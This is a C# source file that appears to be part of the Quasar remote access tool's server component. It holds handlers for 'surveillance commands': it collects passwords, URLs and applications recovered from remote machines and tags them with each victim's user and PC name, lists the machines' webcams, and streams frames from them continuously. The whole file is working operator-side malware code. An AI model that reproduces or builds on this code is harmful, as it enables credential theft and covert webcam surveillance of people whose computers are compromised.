using Quasar.Common.IO;
using Quasar.Common.Messages;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPasswordsResponse(Client client, GetPasswordsResponse packet)
        {
            if (client.Value == null || client.Value.FrmPass == null)
                return;

            if (packet.Passwords == null)
                return;

            string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);

            var lst =
                packet.Passwords.Select(str => str.Split(new[] {DELIMITER}, StringSplitOptions.None))
                    .Select(
                        values =>
                            new RecoveredAccount
                            {
                                Username = values[0],
                                Password = values[1],
                                Url = values[2],
                                Application = values[3]
                            })
                    .ToList();

            if (client.Value != null && client.Value.FrmPass != null)
                client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
        }

        public static void HandleGetWebcamsResponse(Client client, GetWebcamsResponse packet)
        {
            if (client.Value == null || client.Value.FrmWebcam == null)
                return;

            client.Value.FrmWebcam.AddWebcams(packet.Webcams);
        }

        public static void HandleGetWebcamResponse(Client client, GetWebcamResponse packet)
        {
            if (client.Value == null ||  client.Value.FrmWebcam == null
                || client.Value.FrmWebcam.IsDisposed
                || client.Value.FrmWebcam.Disposing)
                return;

            if (packet.Image == null)
                return;

            using (MemoryStream ms = new MemoryStream(packet.Image))
            {
                Bitmap img = new Bitmap(ms);
                client.Value.FrmWebcam.UpdateImage(img);
            }

            if (client.Value != null && client.Value.FrmWebcam != null && client.Value.FrmWebcam.IsStarted)
            {
                client.Send(new GetWebcam {Webcam = packet.Webcam, Resolution = packet.Resolution});
            }
        }
    }
}